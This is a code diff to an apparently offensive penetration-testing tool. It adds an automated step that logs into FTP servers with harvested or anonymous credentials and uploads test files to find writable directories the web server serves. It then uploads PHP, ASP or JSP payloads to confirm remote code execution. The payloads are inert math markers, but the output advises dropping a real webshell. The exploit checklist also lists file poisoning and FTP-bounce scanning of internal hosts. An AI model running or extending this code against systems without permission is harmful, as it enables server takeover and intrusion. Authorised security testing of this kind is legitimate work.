@@ -2223,6 +2223,18 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"SMB readable shares: {len(files)} sensitive file(s)"[:140]}
         return None
 
+    # 2ax) ftp-webshell: FTP-writable dir served by a web root → code execution
+    if sid == "ftp-webshell":
+        rcehits = re.findall(r"^✗ RCE (.+)$", output, re.M)
+        served = re.findall(r"^✗ SERVED (.+)$", output, re.M)
+        if rcehits:
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"FTP→web RCE: {rcehits[0].strip()}"[:140]}
+        if served:
+            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
+                    "summary": f"FTP dir web-served: {served[0].strip()}"[:140]}
+        return None
+
     # 2aw) ftp-creds: default / reused FTP login worked → immediate access
     if sid == "ftp-creds":
         hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
@@ -3080,7 +3092,7 @@ _EXPLOIT_STEPS = {
         ("Anonymous login (anonymous:<any>) → browse the tree", "ftp-anon"),
         ("Download everything; test write access (upload a throwaway file)", "ftp-write"),
         ("Try known / default / reused creds; targeted brute only if lockout allows", "ftp-creds"),
-        "If FTP root maps to a web root or is writable → drop a webshell / poison a served file",
+        ("If FTP root maps to a web root or is writable → drop a webshell / poison a served file", "ftp-webshell"),
         "FTP-bounce (PORT) to reach & scan internal hosts through the server",
         # ── land a shell & foothold ──
         "Spawn & upgrade an interactive shell",
@@ -10740,6 +10752,147 @@ def _tool_ftp_creds(ip: str, port: int, proto: str) -> str:
     return f"FTP credentials — {ip}:{port}\n\n" + "\n".join(lines)
 
 
+# ── FTP step 5: FTP-writable dir served by a web root → webshell (RCE) ──────────
+_FTPWEB_DEADLINE = 120
+_FTP_HTTP_PORTS = {80, 443, 8080, 8000, 8443, 8888, 5000, 3000}
+_FTP_SHELLS = {   # inert exec-verify payloads (computed math marker — NOT a live command shell)
+    "php": (".php", lambda mk, a, b: f"<?php echo '{mk}'.({a}*{b}).'{mk}'; ?>"),
+    "asp": (".asp", lambda mk, a, b: f'<% Response.Write("{mk}" & ({a}*{b}) & "{mk}") %>'),
+    "jsp": (".jsp", lambda mk, a, b: f'<%= "{mk}"+({a}*{b})+"{mk}" %>'),
+}
+
+
+def _gather_ftp_creds(ip: str) -> list:
+    """(user, pass) FTP logins ftp-creds proved for this host ('ftp on <ip>' in smb-creds)."""
+    out = []
+    for sid, output in fetch_scripts(ip, 445, "tcp"):
+        if sid != "smb-creds":
+            continue
+        for m in re.finditer(rf"! (\S+?):(\S*) @ ftp on {re.escape(ip)}\b", output or ""):
+            out.append((m.group(1), "" if m.group(2) == "<blank>" else m.group(2)))
+    return out
+
+
+def _ftp_open(ip: str, port: int):
+    """Open an FTP session with the best available access (proven creds first, then anonymous).
+    Returns (ftp, label) or (None, None)."""
+    import ftplib
+    for user, pw in _gather_ftp_creds(ip) + [("anonymous", "anonymous@pshunter")]:
+        try:
+            f = ftplib.FTP(timeout=8)
+            f.connect(ip, port)
+            f.login(user, pw)
+            return f, user
+        except Exception:                                    # noqa: BLE001
+            continue
+    return None, None
+
+
+def _http_get(ip: str, port: int, path: str, tls: bool):
+    """Stdlib GET; returns (status, body) or (None, '')."""
+    import http.client
+    import ssl
+    try:
+        conn = (http.client.HTTPSConnection(ip, port, timeout=8,
+                                            context=ssl._create_unverified_context())
+                if tls else http.client.HTTPConnection(ip, port, timeout=8))
+        conn.request("GET", path, headers={"User-Agent": "pshunter"})
+        r = conn.getresponse()
+        body = r.read(200000).decode("utf-8", "ignore")
+        conn.close()
+        return r.status, body
+    except Exception:                                        # noqa: BLE001
+        return None, ""
+
+
+def _tool_ftp_webshell(ip: str, port: int, proto: str) -> str:
+    """FTP step 5 tool: if an FTP-writable directory is served by a web root, that is RCE. It
+    uploads a marker via FTP and fetches it over HTTP to prove the mapping, then uploads an
+    inert exec-verify payload (computed math marker, NOT a live command shell), confirms it
+    executes, and removes both files (reversible). Reports the confirmed drop URL. Needs FTP
+    access + an HTTP service on the host. Authorised targets only."""
+    import io
+    import random
+    import time
+    hports = [(p, p in (443, 8443)) for p, pr, _st in fetch_ports(ip)
+              if p in _FTP_HTTP_PORTS and pr == "tcp"]
+    if not hports:
+        raise RuntimeError("no HTTP service on this host — nothing to correlate the FTP write with")
+    ftp, who = _ftp_open(ip, port)
+    if not ftp:
+        raise RuntimeError("no FTP access — run ftp-anon (r2) / ftp-creds (r4) first")
+
+    deadline = time.time() + _FTPWEB_DEADLINE
+    files, dirs = [], []
+    _ftp_walk(ftp, "", 0, files, dirs, deadline)
+    wdirs = [d for d in ([""] + dirs[:20]) if (_ftp_writable(ftp, d) or (False,))[0]]
+
+    served, rce = [], []
+    for d in wdirs:
+        if time.time() > deadline:
+            break
+        marker = f"~pshm_{random.randint(10000, 99999)}"
+        try:
+            ftp.cwd("/" + d if d else "/")
+            ftp.storbinary(f"STOR {marker}.txt", io.BytesIO(marker.encode() + b"\n"))
+        except Exception:                                    # noqa: BLE001
+            continue
+        base = d.split("/")[-1] if d else ""
+        hit = None
+        for hport, tls in hports:
+            for path in [f"/{marker}.txt"] + ([f"/{base}/{marker}.txt"] if base else []):
+                st, body = _http_get(ip, hport, path, tls)
+                if st == 200 and marker in body:
+                    hit = (hport, tls, path.rsplit("/", 1)[0])
+                    break
+            if hit:
+                break
+        if hit:
+            served.append((("/" + d) if d else "/", f"{'https' if hit[1] else 'http'}://{ip}:{hit[0]}{hit[2]}/"))
+            a, b, mk = random.randint(1000, 9999), random.randint(1000, 9999), f"pshFTP{random.randint(100, 999)}"
+            for lang in _detect_web_langs(ip, hit[0], proto)[:2]:
+                ext, gen = _FTP_SHELLS.get(lang, (None, None))
+                if not ext:
+                    continue
+                shell = f"~pshs_{random.randint(10000, 99999)}{ext}"
+                try:
+                    ftp.storbinary(f"STOR {shell}", io.BytesIO(gen(mk, a, b).encode()))
+                except Exception:                            # noqa: BLE001
+                    continue
+                spath = f"{hit[2]}/{shell}"
+                st, body = _http_get(ip, hit[0], spath, hit[1])
+                if st == 200 and f"{mk}{a * b}{mk}" in body:
+                    rce.append((lang, f"{'https' if hit[1] else 'http'}://{ip}:{hit[0]}{spath}"))
+                try:
+                    ftp.delete(shell)
+                except Exception:                            # noqa: BLE001
+                    pass
+                if rce:
+                    break
+        try:
+            ftp.cwd("/" + d if d else "/")
+            ftp.delete(f"{marker}.txt")
+        except Exception:                                    # noqa: BLE001
+            pass
+    try:
+        ftp.quit()
+    except Exception:                                        # noqa: BLE001
+        ftp.close()
+
+    lines = [f"[*] FTP access: {who}   HTTP: {', '.join(str(p) for p, _t in hports)}"]
+    for lang, url in rce:
+        lines.append(f"✗ RCE {lang} {url}  (exec-verified, removed)")
+    for d, urlbase in served:
+        lines.append(f"✗ SERVED {d} → {urlbase}")
+    if rce:
+        lines.append("· FTP→web RCE confirmed — drop your webshell in the served dir over FTP")
+    elif served:
+        lines.append("· FTP dir is web-served but code didn't execute — try another extension / dir")
+    else:
+        lines.append("· no FTP-writable dir is served by the web root")
+    return f"FTP → webshell — {ip}:{port}\n\n" + "\n".join(lines)
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("HTTP headers (stdlib, no redirects)", _tool_http_headers),
@@ -10793,6 +10946,7 @@ _STEP_TOOLS = {
     "ftp-anon": ("Anonymous login → browse tree (stdlib ftplib, read-only)", _tool_ftp_anon),
     "ftp-write": ("Test write access → throwaway upload (stdlib, reversible)", _tool_ftp_write),
     "ftp-creds": ("Default + reused FTP creds (stdlib, targeted, lockout-safe)", _tool_ftp_creds),
+    "ftp-webshell": ("FTP-writable + web root → webshell RCE (stdlib, exec-verified)", _tool_ftp_webshell),
 }
 
 def _mins(seconds: int) -> str:
@@ -10861,6 +11015,7 @@ _STEP_TOOL_RUNS = {
     "ftp-anon":         ("Python", f"{_mins(_FTPANON_DEADLINE)} min"),
     "ftp-write":        ("Python", f"{_mins(_FTPWRITE_DEADLINE)} min"),
     "ftp-creds":        ("Python", f"{_mins(_FTPCREDS_DEADLINE)} min"),
+    "ftp-webshell":     ("Python", f"{_mins(_FTPWEB_DEADLINE)} min"),
 }
 
 
@@ -11022,6 +11177,10 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         print(f"{YELLOW}   ⚠ SMB version-RCE scan{RESET}{DIM} — detection only (nmap NSE + netexec), "
               f"no exploitation / no unsafe probes · {RESET}{YELLOW}authorized targets only{RESET}"
               f"{DIM} · deadline {_SMBVULN_DEADLINE // 60} min{RESET}")
+    if tool_key == "ftp-webshell":                # correlates FTP write with a web root — WRITES
+        print(f"{DIM}   uploads a marker via FTP + fetches it over HTTP to prove FTP↔web-root; on a "
+              f"hit, an inert exec-verify payload confirms code exec, then both files are removed "
+              f"(reversible) · {RESET}{YELLOW}authorised targets only{RESET}")
     if tool_key == "ftp-creds":                   # curated defaults + reuse, not a wordlist brute
         print(f"{DIM}   tries curated FTP defaults + harvested passwords (reuse) — targeted, not a "
               f"wordlist brute (lockout-safe); a full hydra brute stays manual · "
